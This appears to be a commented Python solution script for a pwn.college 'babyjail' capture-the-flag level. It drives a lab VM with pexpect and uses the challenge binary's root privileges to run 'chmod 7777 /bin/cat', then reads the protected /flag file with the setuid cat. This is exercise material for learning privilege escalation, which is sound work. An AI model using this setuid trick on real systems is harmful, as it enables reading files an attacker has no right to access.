def exploit(): # Quite similar to exercise 14, but this time we will use elevated permissions of cat to read the flag
    child = pexpect.spawn('vm connect')  # Launch the 'vm connect' command to connect to the VM
    
    child.expect(r'Last login:', timeout=60)  # Wait for the "Last login:" message indicating the connection is established
    
    child.sendline('/challenge/babyjail_level15')  # Execute the challenge binary
    child.expect(r'bash-5.0# ', timeout=60)  # Wait for the bash prompt in the jail environment
    
    child.sendline('chmod 7777 /bin/cat')  # Elevate the permissions of the 'cat' command using the program's privileges
    child.expect(r'bash-5.0# ', timeout=60)  # With elevated permissions, we will be able to read the flag outside the sandbox
    child.sendline('exit')  # Exit the program now that we can read the flag

    child.sendline('cd /usr/bin')  # Change directory to /usr/bin
    child.sendline('cat /flag')  # Use 'cat' with elevated permissions to read the flag
    child.expect(r'pwn\.college\{.*?\}', timeout=60)  # Wait for and extract the flag in the pwn.college{...} format
    flag = child.after.decode().strip()  # Decode and strip any extra whitespace from the flag
    print(f'Flag: {flag}')  # Print the flag

    child.sendline('exit')  # Exit the VM
    child.close()  # Close the connection

if __name__ == "__main__":
    exploit()  # Execute the exploit function
